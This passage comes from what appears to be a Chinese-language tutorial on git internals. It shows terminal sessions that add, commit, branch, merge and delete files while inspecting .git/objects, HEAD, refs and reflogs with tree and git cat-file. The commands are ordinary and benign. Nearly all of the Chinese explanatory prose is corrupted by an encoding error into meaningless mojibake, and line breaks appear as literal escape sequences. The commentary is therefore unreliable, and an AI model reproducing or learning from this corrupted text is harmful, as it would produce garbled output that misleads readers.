â”‚Â â”œâ”€â”€ pre-rebase.sample â”‚Â â”œâ”€â”€ pre-receive.sample â”‚Â â””â”€â”€ update.sample â”œâ”€â”€ info â”‚Â â””â”€â”€ exclude â”œâ”€â”€ objects # å­˜æ”¾ä¸åŒç§ç±»çš„ git å¯¹è±¡ï¼Œå®ç°ç‰ˆæœ¬ç®¡ç†çš„å…³é”® â”‚Â â”œâ”€â”€ info â”‚Â â””â”€â”€ pack â””â”€â”€ refs â”œâ”€â”€ heads â””â”€â”€ tags # git æ ‡ç­¾ ç¬¬ä¸€æ¬¡ git add | git commit git add Add file contents to the index æ·»åŠ æ–‡ä»¶å†…å®¹åˆ° index åŒº\næ·»åŠ ä¸¤ä¸ªæ–‡ä»¶ file1 å’Œ file2, æ–‡ä»¶å†…å®¹åˆ†åˆ«æ˜¯ 111 å’Œ 222\ngit add file_name\ngit add file1 tree .git/objects æŸ¥çœ‹æ·»åŠ çš„ git object .git/objects/ â”œâ”€â”€ 58 â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c â”œâ”€â”€ info â””â”€â”€ pack å¯¹ file1 æ–‡ä»¶å†…å®¹ä¹Ÿå°±æ˜¯ 111 å’Œä¸€äº›å…¶ä»–çš„ä¿¡æ¯åš SHA-1 è¿ç®—å¾—å‡º 58c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c è¿™ä¸ª 40 ä½ 16 è¿›åˆ¶çš„å€¼.\ngit cat-file æŸ¥çœ‹ objects ç›¸å…³ä¿¡æ¯ æŸ¥çœ‹ object ç±»å‹ git cat-file -t 58c9bd blob æŸ¥çœ‹ object å¤§å°\ngit cat-file -s 58c9bd 4 æŸ¥çœ‹ object å†…å®¹\ngit cat-file -p 58c9bd 111 å¯¹æ–‡ä»¶å†…å®¹ä¸º 222 çš„ file2 è¿›è¡Œæ­¥éª¤ 2 ~ 4. æŸ¥çœ‹ .git/objects å¦‚ä¸‹:\n.git/objects/ â”œâ”€â”€ 58 â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c # file1:blob â”œâ”€â”€ c2 â”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c # file2:blob â”œâ”€â”€ info â””â”€â”€ pack git commit Stores the current contents of the index in a new commit along with a log message from the user describing the changes. A commit in a git repository records a snapshot of all the files in your directory.\næ‰§è¡Œ git commit -m â€œadd file1 and file2â€ æŸ¥çœ‹ .git/objects çš„å˜åŒ– tree .git/objects .git/objects/ â”œâ”€â”€ 58 â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c # file1:blob â”œâ”€â”€ 73 â”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5 # 1:commit â”œâ”€â”€ c2 â”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c # file2:blob â”œâ”€â”€ d9 â”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0 # 1:tree â”œâ”€â”€ info â””â”€â”€ pack æŸ¥çœ‹ HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/master # ç›®å‰åœ¨ master åˆ†æ”¯ä¸Š root@aliyun:~/blog# cat .git/refs/heads/master 73622e96d5b5389d63dd74e3c40db9d4c4296ff5 # 1:commit ç¬¬äºŒæ¬¡ git add | git commit ä¿®æ”¹ file1 çš„æ–‡ä»¶å†…å®¹ä¸º 333\ngit add file1 root@aliyun:~/blog# git add file1 root@aliyun:~/blog# tree .git/objects/ .git/objects/ â”œâ”€â”€ 55 â”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550 # file1_modify: blob â”œâ”€â”€ 58 â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c â”œâ”€â”€ 73 â”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5 â”œâ”€â”€ c2 â”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c â”œâ”€â”€ d9 â”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0 â”œâ”€â”€ info â””â”€â”€ pack git commit -m â€œmodify file1â€ root@aliyun:~/blog# git commit -m \"modify file1\" [master 558e28c] modify file1 1 file changed, 1 insertion(+), 1 deletion(-) root@aliyun:~/blog# tree .git/objects/ .git/objects/ â”œâ”€â”€ 55 â”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e # 2:commit â”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550 # file1_modify: blob â”œâ”€â”€ 58 â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c â”œâ”€â”€ 61 â”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 # 2:tree â”œâ”€â”€ 73 â”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5 â”œâ”€â”€ c2 â”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c â”œâ”€â”€ d9 â”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0 â”œâ”€â”€ info â””â”€â”€ pack æŸ¥çœ‹ HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/master root@aliyun:~/blog# cat .git/refs/heads/master 558e28c67089eea9bdfbfd748d32baa8f2ce944e # æŒ‡å‘äº†ç¬¬äºŒæ¬¡ commit çš„ hash å€¼ git add | git commit å®è´¨ git add: å‘ .git/objects æ·»åŠ ç±»å‹æ˜¯ blob çš„æ–‡ä»¶ git commit: å‘ .git/objects æ·»åŠ ç±»å‹æ˜¯ tree å’Œ commit çš„æ–‡ä»¶\ngit branch List, create, or delete branches Branches in Git are incredibly lightweight as well. They are simply pointers to a specific commit â€“ nothing more. ä»…ä»…æ˜¯æ·»åŠ äº†ä¸€ä¸ªæŒ‡å‘ç‰¹å®š commit çš„æŒ‡é’ˆã€‚ a branch essentially says â€œI want to include the work of this commit and all parent commits.â€ ä¸€ä¸ªåˆ†æ”¯å°±æ˜¯æˆ‘æƒ³è¦è¿™ä¸ª commit ä»¥åŠè¿™ä¸ª commit çš„æ‰€æœ‰ parent commits\nåˆ›å»ºä¸€ä¸ª new-branch çš„åˆ†æ”¯ root@aliyun:~/blog# git branch new-branch root@aliyun:~/blog# tree .git/ .git/ â”œâ”€â”€ branches â”œâ”€â”€ COMMIT_EDITMSG â”œâ”€â”€ config â”œâ”€â”€ description â”œâ”€â”€ HEAD â”œâ”€â”€ hooks â”‚Â â”œâ”€â”€ applypatch-msg.sample â”‚Â â”œâ”€â”€ commit-msg.sample â”‚Â â”œâ”€â”€ fsmonitor-watchman.sample â”‚Â â”œâ”€â”€ post-update.sample â”‚Â â”œâ”€â”€ pre-applypatch.sample â”‚Â â”œâ”€â”€ pre-commit.sample â”‚Â â”œâ”€â”€ prepare-commit-msg.sample â”‚Â â”œâ”€â”€ pre-push.sample â”‚Â â”œâ”€â”€ pre-rebase.sample â”‚Â â”œâ”€â”€ pre-receive.sample â”‚Â â””â”€â”€ update.sample â”œâ”€â”€ index â”œâ”€â”€ info â”‚Â â””â”€â”€ exclude â”œâ”€â”€ logs â”‚Â â”œâ”€â”€ HEAD â”‚Â â””â”€â”€ refs â”‚Â â””â”€â”€ heads â”‚Â â”œâ”€â”€ master â”‚Â â””â”€â”€ new-branch # git branch new-branch æ·»åŠ çš„åˆ†æ”¯æ—¥å¿— â”œâ”€â”€ objects â”‚Â â”œâ”€â”€ 55 â”‚Â â”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e â”‚Â â”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550 â”‚Â â”œâ”€â”€ 58 â”‚Â â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c â”‚Â â”œâ”€â”€ 61 â”‚Â â”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 â”‚Â â”œâ”€â”€ 73 â”‚Â â”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5 â”‚Â â”œâ”€â”€ c2 â”‚Â â”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c â”‚Â â”œâ”€â”€ d9 â”‚Â â”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0 â”‚Â â”œâ”€â”€ info â”‚Â â””â”€â”€ pack â””â”€â”€ refs â”œâ”€â”€ heads â”‚Â â”œâ”€â”€ master â”‚Â â””â”€â”€ new-branch # git branch new-branch æ·»åŠ çš„ refs â””â”€â”€ tags 18 directories, 29 files git branch - -list æŸ¥çœ‹åˆ†æ”¯ root@aliyun:~/blog# git branch --list * master # * è¡¨ç¤ºå½“å‰æ‰€åœ¨åˆ†æ”¯ new-branch # æ–°åˆ›å»ºçš„ new-branch åˆ†æ”¯ git checkout new-branch åˆ‡æ¢åˆ†æ”¯ root@aliyun:~/blog# git checkout new-branch Switched to branch 'new-branch' root@aliyun:~/blog# git branch --list master * new-branch åˆ›å»ºåˆ†æ”¯ new-branch, å¹¶åˆ‡æ¢åˆ° new-branch åˆ†æ”¯.\ngit branch new-branch git checkout new-branch å¯ä»¥ç®€åŒ–ä¸º: git checkout -b new-branch æŸ¥çœ‹ HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/new-branch root@aliyun:~/blog# cat .git/refs/heads/new-branch 558e28c67089eea9bdfbfd748d32baa8f2ce944e # æŒ‡å‘äº†ç¬¬äºŒæ¬¡ commit çš„ hashå€¼ ç”±æ­¤å¯çŸ¥ git branch new-branch åˆ›å»ºä¸€ä¸ªåˆ†æ”¯,å®é™…ä¸Šåšäº†ä¸¤ä»¶äº‹æƒ…:\næ·»åŠ  .git/logs/refs/heads/new-branch è®°å½•è¯¥åˆ†æ”¯çš„ log æ·»åŠ  .git/refs/heads/new-branch æŒ‡å‘æœ€æ–°çš„ commit è¿™ä¹Ÿå°±æ˜¯ git åˆ›å»ºæ–°çš„åˆ†æ”¯å¦‚æ­¤å¿«çš„åŸå› . ç¬¬ä¸‰æ¬¡ git add | git commit åˆ‡æ¢åˆ° new-branch åˆ†æ”¯, æ–°å»ºä¸€ä¸ª file3 çš„æ–‡ä»¶, å†…å®¹æ˜¯ new-branch-file3\ngit add file3 root@aliyun:~/blog# git add file3 root@aliyun:~/blog# tree .git/objects/ .git/objects/ â”œâ”€â”€ 2e â”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a # file3 â”œâ”€â”€ 55 â”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e â”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550 â”œâ”€â”€ 58 â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c â”œâ”€â”€ 61 â”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 â”œâ”€â”€ 73 â”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5 â”œâ”€â”€ c2 â”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c â”œâ”€â”€ d9 â”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0 â”œâ”€â”€ info â””â”€â”€ pack 9 directories, 8 files root@aliyun:~/blog# git cat-file -t 2e79 blob root@aliyun:~/blog# git cat-file -p 2e79 new-branch-file3 root@aliyun:~/blog# git cat-file -s 2e79 17 git commit -m â€œfile3 on new-branchâ€ root@aliyun:~/blog# git commit -m \"add file3 on new-branch\" [new-branch ce907fa] add file3 on new-branch 1 file changed, 1 insertion(+) create mode 100644 file3 root@aliyun:~/blog# tree .git/objects/ .git/objects/ â”œâ”€â”€ 2e â”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a â”œâ”€â”€ 55 â”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e â”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550 â”œâ”€â”€ 58 â”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c â”œâ”€â”€ 61 â”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560 â”œâ”€â”€ 73 â”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5 â”œâ”€â”€ b7 â”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3 # new-branch:tree â”œâ”€â”€ c2 â”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c â”œâ”€â”€ ce â”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44 # new-branch:commit â”œâ”€â”€ d9 â”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0 â”œâ”€â”€ info â””â”€â”€ pack 11 directories, 10 files root@aliyun:~/blog# git cat-file -t b721 tree root@aliyun:~/blog# git cat-file -p b721 # å…¨é‡çš„å¿«ç…§(snapshot) 100644 blob 55bd0ac4c42e46cd751eb7405e12a35e61425550 file1 100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3 root@aliyun:~/blog# git cat-file -s b721 99 root@aliyun:~/blog# git cat-file -t ce90 commit root@aliyun:~/blog# git cat-file -p ce90 tree b72118da210e8e3f4127cfc16cc819eff58e42e3 parent 558e28c67089eea9bdfbfd748d32baa8f2ce944e # ä¸Šä¸€æ¬¡ commit author root \u003croot@aliyun\u003e 1578039532 +0800 committer root \u003croot@aliyun\u003e 1578039532 +0800 add file3 on new-branch # commit message root@aliyun:~/blog# git cat-file -s ce90 208 æŸ¥çœ‹ HEAD root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/new-branch # å½“å‰åœ¨ new-branch åˆ†æ”¯ä¸Š root@aliyun:~/blog# cat .git/refs/heads/new-branch ce907fabd08138058b05428d7cac017507b33c44 # new-branch åˆ†æ”¯æœ€æ–°çš„æäº¤ åˆ‡æ¢åˆ° master åˆ†æ”¯æŸ¥çœ‹ HEAD root@aliyun:~/blog# git checkout master Switched to branch 'master' root@aliyun:~/blog# cat .git/HEAD ref: refs/heads/master # å½“å‰åœ¨ master åˆ†æ”¯ root@aliyun:~/blog# cat .git/refs/heads/master 558e28c67089eea9bdfbfd748d32baa8f2ce944e # master åˆ†æ”¯æœ€æ–°çš„æäº¤ æŸ¥çœ‹ master å’Œ new-branch ä¸¤ä¸ªåˆ†æ”¯å¯çŸ¥, æ¯ä¸€åˆ†æ”¯å¯¹åº”çš„ HEAD å’Œ .git/refs/heads/branch_name è®°å½•çš„ commit ä¸åŒ. è¿™å°±æ˜¯ git åˆ†æ”¯çš„å®ç°.\ngit add | git commit | git branch å›¾è§£ Fast-forward Merge ä¸¤æ¬¡ git add å’Œ git commit ä¹‹åï¼Œåˆ›å»º new-branch ï¼Œåœ¨ new-branch è¿›è¡Œäº†ä¿®æ”¹ã€‚ ä½†æ˜¯ master åˆ†æ”¯æ²¡æœ‰åšä»»ä½•æ›´æ”¹ã€‚ä¹Ÿå°±æ˜¯ master æ­¤æ—¶åˆ†æ”¯è½åäº† new-branch åˆ†æ”¯ã€‚ new-branch åˆ†æ”¯çš„ä¿®æ”¹ master åˆ†æ”¯æ€æ ·çœ‹åˆ°å‘¢ï¼Ÿå¯ä»¥è¿›è¡Œæ‰€è°“çš„ Fast-forward mergeã€‚\nåˆ‡æ¢åˆ° master åˆ†æ”¯ root@aliyun:~/blog# git checkout master # åˆ‡æ¢åˆ° master åˆ†æ”¯\rSwitched to branch 'master'\rroot@aliyun:~/blog# cat .git/refs/heads/master # master åˆ†æ”¯ä»ç„¶æŒ‡å‘ç¬¬äºŒæ¬¡çš„ commitã€‚\r558e28c67089eea9bdfbfd748d32baa8f2ce944e\rroot@aliyun:~/blog# tree .git/objects/ # æŸ¥çœ‹ objects å¯¹è±¡ã€‚\r.git/objects/\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ info\râ””â”€â”€ pack\r11 directories, 10 files åˆå¹¶ new-branch åˆ†æ”¯åˆ° master åˆ†æ”¯ root@aliyun:~/blog# git merge new-branch # åˆå¹¶ new-branch åˆ†æ”¯\rUpdating 558e28c..ce907fa ### æ›´æ–° 558e è¿™ä¸ªobject\rFast-forward # fast-forward\rfile3 | 1 +\r1 file changed, 1 insertion(+)\rcreate mode 100644 file3\rroot@aliyun:~/blog# ls\rfile1 file2 file3\rroot@aliyun:~/blog# tree .git/objects/ # æŸ¥çœ‹ objects å¯¹è±¡ã€‚å¹¶æ²¡å¢åŠ ä»»ä½• object\r.git/objects/\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ info\râ””â”€â”€ pack\r11 directories, 10 files\rroot@aliyun:~/blog# cat .git/refs/heads/master ce907fabd08138058b05428d7cac017507b33c44 # æ›´æ–°äº† master æŒ‡å‘ï¼ŒæŒ‡å‘äº† new-branch çš„ commitã€‚ Fast-Forward å›¾è§£ åˆ é™¤ master åˆ†æ”¯ä¸Šçš„ file1 æ–‡ä»¶ï¼Œç„¶åæäº¤ root@aliyun:~# cp -r blog blog-delete # å¤åˆ¶ä¸€ä»½ï¼Œåœ¨ master åˆ†æ”¯ä¸Šåˆ é™¤ file1\rroot@aliyun:~# cd blog-delete/\rroot@aliyun:~/blog-delete# ls\rfile1 file2 file3\rroot@aliyun:~/blog-delete# tree .git/objects/ # åˆ é™¤å‰çš„ git objects\r.git/objects/\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ info\râ””â”€â”€ pack\r11 directories, 10 files\rroot@aliyun:~/blog-delete# rm file1 # åˆ é™¤file1\rroot@aliyun:~/blog-delete# git status\rOn branch master\rChanges not staged for commit:\r(use \"git add/rm \u003cfile\u003e...\" to update what will be committed)\r(use \"git checkout -- \u003cfile\u003e...\" to discard changes in working directory)\rdeleted: file1\rno changes added to commit (use \"git add\" and/or \"git commit -a\")\rroot@aliyun:~/blog-delete# git add file1 # ä¿®æ”¹æ·»åŠ åˆ° working tree\rroot@aliyun:~/blog-delete# tree .git/objects/ # æ³¨æ„ï¼Œæ­¤æ—¶çš„å¹¶æ²¡æœ‰åˆ é™¤æˆ–è€…å¢åŠ  git objects\r.git/objects/\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ info\râ””â”€â”€ pack\r11 directories, 10 files\rroot@aliyun:~/blog-delete# git status\rOn branch master\rChanges to be committed:\r(use \"git reset HEAD \u003cfile\u003e...\" to unstage)\rdeleted: file1\rroot@aliyun:~/blog-delete# git commit -m \"delete file1 on master\" # æäº¤è¿™ä¸ªä¿®æ”¹åˆ° repository\r[master f24e8b6] delete file1 on master\r1 file changed, 1 deletion(-)\rdelete mode 100644 file1\rroot@aliyun:~/blog-delete# tree .git/objects/ # æŸ¥çœ‹æ­¤æ—¶çš„ git objects\r.git/objects/\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c # blob:file1 ä»ç„¶åœ¨ git objects ä¸­\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba # æ–°æ·»åŠ ä¸€ä¸ª tree\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088 # æ–°æ·»åŠ ä¸€ä¸ª commit\râ”œâ”€â”€ info\râ””â”€â”€ pack\r13 directories, 12 files\rroot@aliyun:~/blog-delete# git cat-file -s ba61 # ba61 çš„å¤§å°,zlib compressed data\r66\rroot@aliyun:~/blog-delete# git cat-file -t ba61 # ba61 çš„ç±»å‹\rtree\rroot@aliyun:~/blog-delete# git cat-file -p ba61\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 # master åˆ†æ”¯å‰©ä¸‹çš„ file2\r100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3 # master åˆ†æ”¯å‰©ä¸‹çš„ file3\rroot@aliyun:~/blog-delete# git cat-file -s f24e\r207\rroot@aliyun:~/blog-delete# git cat-file -t f24e # æ–°åŠ çš„ commit object\rcommit\rroot@aliyun:~/blog-delete# git cat-file -p f24e\rtree ba61ba35d824408f8135ec77b7efdcdfc0281fba # æ–°åŠ çš„ tree object\rparent ce907fabd08138058b05428d7cac017507b33c44 # delete file1 ä¹‹å‰çš„ commit object\rauthor root \u003croot@aliyun\u003e 1586307459 +0800\rcommitter root \u003croot@aliyun\u003e 1586307459 +0800\rdelete file1 on master\rroot@aliyun:~/blog-delete# cat .git/refs/heads/master # master åˆ†æ”¯æŒ‡å‘äº†æ–°çš„ commit\rf24e8b6fb771347156b615c795f7fd886dc49088\rroot@aliyun:~/blog-delete# cat .git/logs/refs/heads/\rmaster new-branch root@aliyun:~/blog-delete# cat .git/logs/refs/heads/master # æŸ¥çœ‹ master åˆ†æ”¯çš„æäº¤æ—¥å¿—\r0000000000000000000000000000000000000000 73622e96d5b5389d63dd74e3c40db9d4c4296ff5 root \u003croot@aliyun\u003e 1578027036 +0800 commit (initial): add file1 and file2\r73622e96d5b5389d63dd74e3c40db9d4c4296ff5 558e28c67089eea9bdfbfd748d32baa8f2ce944e root \u003croot@aliyun\u003e 1578036269 +0800 commit: modify file1\r558e28c67089eea9bdfbfd748d32baa8f2ce944e ce907fabd08138058b05428d7cac017507b33c44 root \u003croot@aliyun\u003e 1586241477 +0800 merge new-branch: Fast-forward\rce907fabd08138058b05428d7cac017507b33c44 f24e8b6fb771347156b615c795f7fd886dc49088 root \u003croot@aliyun\u003e 1586307459 +0800 commit: delete file1 on master master åˆ†æ”¯åˆ é™¤ file1 å›¾è§£ master åˆ†æ”¯åˆ é™¤ file1 å›¾è§£åˆ†æ master åˆ†æ”¯ git ä¸­åˆ é™¤ä¸€ä¸ªæ–‡ä»¶çš„å®è´¨æ˜¯ï¼š\nç”Ÿæˆä¸€ä¸ª tree object ba61baï¼ŒæŒ‡å‘å‰©ä¸‹çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æœ€æ–°çš„ blob objectã€‚blob c20090 file2 å’Œ blob 2e799a file3 ç”Ÿæˆä¸€ä¸ª commit f24e8b èŠ‚ç‚¹ï¼ŒæŒ‡å‘æœ¬æ¬¡æäº¤çš„ä¸Šä¸€ä¸ª commit object(ce907f) å’Œè¿™æ¬¡æäº¤ç”Ÿæˆçš„ tree object(ba61ba)ã€‚ ç§»åŠ¨ master å’Œ HEAD çš„æŒ‡å‘ï¼ŒæŒ‡å‘æœ¬æ¬¡æäº¤çš„ commit object f24e8bã€‚ åœ¨ master çš„ .git/logs/refs/heads/master åˆ†æ”¯æ·»åŠ æœ¬æ¬¡æäº¤çš„ git logã€‚ åˆ é™¤ file1ï¼Œä½†æ˜¯ git object ä¸‹ file1 çš„ blob(58c9bd) å¹¶æ²¡æœ‰åˆ é™¤ã€‚è¿™ä¹Ÿæ„å‘³ç€å¯ä»¥æ¢å¤ file1ã€‚ å…¶ä»–åˆ†æ”¯åŒç†ã€‚ åˆå¹¶åˆ†æ”¯(combine work) ä½¿ç”¨ git merge Merging in Git creates a special commit that has two unique parents. A commit with two parents essentially means â€œI want to include all the work from this parent over here and this one over here, and the set of all their parents.â€\nnew-branch åˆ†æ”¯æ·»åŠ  file4 new-branch åˆ†æ”¯æ·»åŠ  file4 æ­¥éª¤ root@aliyun:~# cd blog-delete\rroot@aliyun:~/blog-delete# ls\rfile2 file3\rroot@aliyun:~/blog-delete# git branch --list # æŸ¥çœ‹åˆ†æ”¯\r* master\rnew-branch\rroot@aliyun:~/blog-delete# git checkout new-branch # åˆ‡æ¢åˆ° new-branch\rSwitched to branch 'new-branch'\rroot@aliyun:~/blog-delete# ls\rfile1 file2 file3\rroot@aliyun:~/blog-delete# echo 444 \u003e file4 # åˆ›å»º file4\rroot@aliyun:~/blog-delete# git status\rOn branch new-branch\rUntracked files:\r(use \"git add \u003cfile\u003e...\" to include in what will be committed)\rfile4\rnothing added to commit but untracked files present (use \"git add\" to track)\rroot@aliyun:~/blog-delete# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 2e\râ”‚Â 